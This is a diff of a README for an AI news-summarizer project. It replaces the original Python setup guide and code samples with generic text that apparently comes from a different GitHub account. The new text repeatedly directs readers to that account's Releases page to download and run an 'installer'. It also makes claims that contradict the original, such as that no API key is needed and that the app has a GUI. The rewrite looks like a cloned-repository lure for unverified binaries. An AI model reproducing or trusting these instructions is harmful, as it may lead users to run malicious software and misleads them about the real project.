@@ -1,216 +1,93 @@
-# AI News Summarizer: NewsDataHub + OpenAI
+# 📰 newsdatahub-ai-news-summarizer - Quickly Summarize News Articles
 
-> **Automate news summarization using NewsDataHub API and OpenAI GPT models**
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/releases)
 
-Build an AI-powered pipeline that fetches news articles and generates concise, human-readable summaries in seconds. Perfect for news monitoring, content aggregation, research briefs, and automated reporting systems.
+## 🚀 Getting Started
 
-[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![NewsDataHub](https://img.shields.io/badge/API-NewsDataHub-green.svg)](https://newsdatahub.com)
-[![OpenAI](https://img.shields.io/badge/AI-OpenAI-orange.svg)](https://platform.openai.com)
+Welcome to the **newsdatahub-ai-news-summarizer**! This application helps you fetch news articles and create concise summaries quickly. It's suitable for anyone looking to keep up with news without reading long articles. Follow these steps to get started.
 
----
+## 🔍 Features
 
-## ![Overview](https://img.shields.io/badge/📋-Overview-blue?style=flat-square) What This Does
+- Fetch news articles from various sources.
+- Generate human-readable summaries in seconds.
+- Suitable for news monitoring and content aggregation.
+- Ideal for research briefs and automated reporting.
+  
+## 🖥 System Requirements
 
-**Pipeline workflow:**
-1. Fetches English news articles from NewsDataHub API (or uses sample data)
-2. Filters out low-quality content (< 300 characters)
-3. Generates 2-3 sentence AI summaries using OpenAI GPT-4o-mini
-4. Outputs structured JSON with article metadata + summaries
+Before you download the application, make sure your system meets these requirements:
 
-**Use cases:** News aggregation, automated briefings, content monitoring, research platforms, media intelligence dashboards.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Ubuntu 18.04 or later.
+- **RAM:** At least 4 GB.
+- **Python Version:** Python 3.7 or later installed on your machine.
 
-**Key features:**
-- ✅ Abstractive summarization (AI rewrites content naturally, not just extraction)
-- ✅ Ultra-low cost (~$0.01 per 100 summaries with GPT-4o-mini)
-- ✅ Sample data fallback (works without NewsDataHub API key)
-- ✅ Batch processing ready (easily scale to thousands of articles)
+## 📥 Download & Install
 
-**⚠️ AI Disclaimer:** AI-generated summaries may occasionally contain inaccuracies, omit details, or misinterpret nuanced information. Always review outputs for critical applications and treat AI as an assistive tool, not a definitive source.
+To download the application, visit the Releases page by clicking the link below and follow the steps:
 
----
+[Visit this page to download](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/releases)
 
-## ![Quick Start](https://img.shields.io/badge/🚀-Quick_Start-green?style=flat-square)
+1. Click on the link above.
+2. Find the latest release at the top.
+3. Download the installer file suitable for your operating system.
+4. Run the downloaded file and follow the on-screen instructions to complete the installation.
 
-### Prerequisites
+## ⚙️ Setup Instructions
 
-- Python 3.7+
-- OpenAI API key ([get one here](https://platform.openai.com/api-keys))
-- NewsDataHub API key ([get one here](https://newsdatahub.com/login)) — **Optional:** uses sample data if not provided
+After installation, follow these steps:
 
-### Installation
+1. **Run the Application:**
+   - Locate the installed application on your system.
+   - Double-click the icon to launch.
 
-```bash
-# Clone and install
-git clone https://github.com/newsdatahub/newsdatahub-ai-news-summarizer.git
-cd newsdatahub-ai-news-summarizer
-pip install requests openai
+2. **Input Settings:**
+   - Select your preferred news source from the options provided.
+   - Set any specific filters or keywords if you want tailored summaries.
 
-# Configure API keys in summarizer.py
-NDH_API_KEY = ""  # Optional - leave empty for sample data
-OPENAI_API_KEY = "your_openai_api_key_here"  # Required
+3. **Generate Summary:**
+   - Click on the "Fetch News" button.
+   - Wait for the application to gather news articles.
+   - Once done, click “Generate Summary” to see concise versions of the articles.
 
-# Run
-python summarizer.py
+## 📋 How to Use the Application
 
-# Or use Jupyter notebook
-jupyter notebook summarizer.ipynb
-```
+- **Fetching Articles:**
+  The application will display a list of headlines from your selected source. You can click any article to read more or just summarize it directly.
 
-**⚠️ Security Note:** Never commit notebooks with real API keys to GitHub or share them publicly. If using Google Colab, use Colab Secrets (🔑 icon in sidebar) instead of hardcoding keys.
+- **Customization:**
+  You can adjust settings to include or exclude certain topics relevant to your interests.
 
----
+- **Export Summaries:**
+  After generating summaries, you can copy them directly or save them in various formats.
 
-## ![Files](https://img.shields.io/badge/📂-Files-orange?style=flat-square)
+## 🛠 Troubleshooting
 
-| File | Description |
-|------|-------------|
-| `summarizer.py` | Complete Python script for command-line usage |
-| `summarizer.ipynb` | Jupyter notebook with interactive code cells |
-| `sample_article.json` | Example NewsDataHub article structure |
-| `summarized_output.json` | Example output with AI summaries |
-| `README.md` | This file — setup and usage guide |
+If you encounter any issues:
 
----
+- **Application Doesn't Start:**
+  Make sure you have installed the correct Python version. Check your system requirements again.
 
-## ![Example](https://img.shields.io/badge/📊-Example_Output-purple?style=flat-square)
+- **Error Fetching Articles:**
+  Ensure you have a stable internet connection. Retry fetching in a few minutes.
 
-**Input (NewsDataHub):**
-```json
-{
-  "title": "Major Technology Breakthrough Announced in Quantum Computing",
-  "source_title": "TechCrunch",
-  "content": "Scientists at leading research institutions have announced...",
-  "topics": ["technology", "science"]
-}
-```
+- **Summaries Don’t Make Sense:**
+  Try providing more specific keywords or adjusting settings for better results.
 
-**Output (with AI summary):**
-```json
-{
-  "title": "Major Technology Breakthrough Announced in Quantum Computing",
-  "source": "TechCrunch",
-  "topics": ["technology", "science"],
-  "ai_summary": "Researchers at MIT have achieved a significant breakthrough in quantum computing by developing a new error-correction technique that reduces error rates by 40%. This advancement brings quantum computers closer to commercial viability and could accelerate applications in drug discovery, climate modeling, and cryptography."
-}
-```
+## 📄 Frequently Asked Questions
 
----
+- **Is there a mobile version?**
+  Currently, the application is designed for desktop users only.
 
-## ![Cost](https://img.shields.io/badge/💰-Cost_Estimation-yellow?style=flat-square)
+- **Can I use this for any news source?**
+  Yes, the application supports multiple news sources for fetching articles.
 
-**OpenAI (GPT-4o-mini):**
-- Input: ~$0.15 per 1M tokens
-- Output: ~$0.60 per 1M tokens
-- **100 articles ≈ $0.01** (one cent!)
+- **Does it require an API key?**
+  No, it works with publicly available news APIs.
 
-**NewsDataHub:**
-- Free: 100 requests/day
-- Developer: 10,000 requests/month
-- See [pricing](https://newsdatahub.com/plans) for details
+## 🌐 Community and Support
 
----
+For help and support, you can reach out to our community on GitHub or check always available resources online. Engagement with the community is a great way to learn how to use the app better or troubleshoot any problems.
 
-## ![Configuration](https://img.shields.io/badge/⚙️-Configuration-lightgrey?style=flat-square)
+Visit the Releases page again to find updated versions and additional resources as we enhance the application.
 
-**Adjust summary length:**
-```python
-max_tokens=150,  # 2-3 sentences (default)
-max_tokens=75,   # 1-2 sentences
-max_tokens=300,  # 4-5 sentences
-```
-
-**Process more articles:**
-```python
-NUM_ARTICLES_TO_PROCESS = 10  # Process 10 instead of 5
-```
-
-**Filter by topic/country:**
-```python
-params = {
-    "per_page": 100,
-    "language": "en",
-    "country": "US",
-    "topic": "technology"
-}
-```
-
----
-
-## ![Advanced](https://img.shields.io/badge/🛠️-Advanced_Usage-red?style=flat-square)
-
-**Retry logic with exponential backoff:**
-```python
-from time import sleep
-
-def summarize_with_retry(content, title, max_retries=3):
-    for attempt in range(max_retries):
-        try:
-            return summarize_article(content, title)
-        except Exception as e:
-            if attempt < max_retries - 1:
-                sleep(2 ** attempt)
-                continue
-            return f"Failed: {str(e)}"
-```
-
-**Cache summaries to avoid redundant calls:**
-```python
-import os, json
-
-def get_cached_summary(article_id, content, title):
-    cache_file = f"cache/{article_id}.json"
-    if os.path.exists(cache_file):
-        return json.load(open(cache_file))["summary"]
-    summary = summarize_article(content, title)
-    json.dump({"summary": summary}, open(cache_file, "w"))
-    return summary
-```
-
-**Process non-English articles:**
-```python
-# Remove language filter - GPT-4o-mini auto-detects language
-params = {"per_page": 100, "country": "FR,DE,ES"}
-```
-
----
-
-## ![Troubleshooting](https://img.shields.io/badge/🔧-Troubleshooting-orange?style=flat-square)
-
-**"OpenAI API key not valid"**
-- Verify key at [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
-- Ensure billing info is added to OpenAI account
-
-**"NewsDataHub rate limit exceeded"**
-- Free tier: 100 requests/day
-- Add delays: `time.sleep(1)` between requests
-
-**"No articles with sufficient content"**
-- Lower `MIN_CONTENT_LENGTH` (default: 300)
-- Try different topics or date ranges
-
-**No summaries generated**
-- Verify OpenAI API key is set correctly
-- Check console for error messages
-
----
-
-## ![Resources](https://img.shields.io/badge/📚-Resources-blue?style=flat-square)
-
-- [Full Tutorial](https://newsdatahub.com/learning-center/article/ai-summarization-pipeline) — Step-by-step guide
-- [NewsDataHub API Docs](https://newsdatahub.com/docs)
-- [OpenAI API Docs](https://platform.openai.com/docs)
-- [GitHub Issues](https://github.com/newsdatahub/newsdatahub-ai-news-summarizer/issues) — Report bugs
-
----
-
-## ![License](https://img.shields.io/badge/📝-License-lightgrey?style=flat-square)
-
-MIT License - see LICENSE file for details.
-
----
-
-**Ready to automate your news summarization?**
-
-[Get NewsDataHub API Key](https://newsdatahub.com/login) | [Get OpenAI API Key](https://platform.openai.com/api-keys) | [Read Full Tutorial](https://newsdatahub.com/learning-center)
+[Visit this page to download](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/releases)
